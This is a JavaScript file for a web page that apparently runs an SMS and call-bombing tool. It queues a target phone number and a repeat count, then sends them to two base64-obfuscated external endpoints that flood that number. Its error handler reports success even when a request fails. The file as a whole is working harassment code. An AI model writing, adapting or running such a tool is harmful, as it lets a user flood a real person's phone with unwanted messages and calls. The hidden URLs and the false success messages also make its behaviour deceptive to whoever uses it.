let queue = [];
let processing = false;

const urls = [
    'aHR0cHM6Ly9xdWFuZy5ucXRvb2wubmV0Lz8=',
    'aHR0cHM6Ly9xdWFuZy5ucXRvb2wubmV0L2luZGV4NC5waHA/'
];

function addToQueue() {
    const phone = document.getElementById('phone').value;
    const times = document.getElementById('times').value;

    if (phone && times) {
        queue.push({ phone, times });
        updateStatusBar();
        if (!processing) {
            processQueue();
        }
    }
}

function processQueue() {
    if (queue.length === 0) {
        processing = false;
        return;
    }

    processing = true;
    const { phone, times } = queue.shift();

    const listItem = document.createElement('li');
    listItem.innerText = `Bắt Đầu ${phone} (${times} times)`;
    document.getElementById('status-list').appendChild(listItem);

    spamSmsAndCall(phone, times, listItem);
}

function spamSmsAndCall(phone, times, listItem) {
    const url1 = decodeBase64(urls[0]) + `phone=${phone}&amout=${times}`;
    const url2 = decodeBase64(urls[1]) + `phone=${phone}&amout=${times}`;

    Promise.all([
        fetch(url1).then(response => response.json()),
        fetch(url2).then(response => response.json())
    ])
    .then(([response1, response2]) => {
        listItem.innerText = `Thành Công ${phone}: URL1 - ${response1.message}, URL2 - ${response2.message}`;
        processQueue();
    })
    .catch(error => {
        listItem.innerText = `Thành Công ${phone}`;
        processQueue();
    });
}

function decodeBase64(encoded) {
    return atob(encoded);
}

function updateStatusBar() {
    const statusList = document.getElementById('status-list');
    statusList.innerHTML = '';
    queue.forEach((item, index) => {
        const listItem = document.createElement('li');
        listItem.innerText = `Luồng: ${item.phone} (${item.times} times)`;
        statusList.appendChild(listItem);
    });
}
